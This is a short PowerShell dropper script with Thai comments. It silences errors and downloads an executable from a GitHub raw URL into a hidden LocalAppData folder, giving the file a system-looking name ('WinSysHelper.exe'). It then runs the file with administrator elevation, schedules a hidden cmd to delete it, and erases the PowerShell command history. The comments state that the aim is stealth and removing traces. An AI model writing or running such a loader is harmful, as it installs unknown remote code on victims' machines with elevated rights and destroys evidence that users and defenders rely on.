# ปิด ErrorAction เพื่อความเงียบ
$ErrorActionPreference = 'SilentlyContinue'

# 1. โหลดไฟล์ไปไว้ใน LocalAppData (เนียนและไม่ต้องขอสิทธิ์สร้างโฟลเดอร์)
$dir = "$env:LOCALAPPDATA\Microsoft\Windows\WinSig"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
$output = "$dir\WinSysHelper.exe"

# 2. ดาวน์โหลดจาก GitHub
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# 3. รันแบบ Admin และสั่ง CMD มารอภารกิจลบไฟล์ทิ้งเบื้องหลัง
if (Test-Path $output) {
    Start-Process -FilePath $output -Verb RunAs
    
    # สั่ง CMD ลบไฟล์และประวัติทิ้งหลังจากผ่านไป 15 วินาที
    $cmd = "timeout /t 15 && del /f /q `"$output`""
    Start-Process cmd -ArgumentList "/c $cmd" -WindowStyle Hidden
}

# 4. ลบประวัติการพิมพ์ใน PowerShell
try { Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue } catch {}

exit
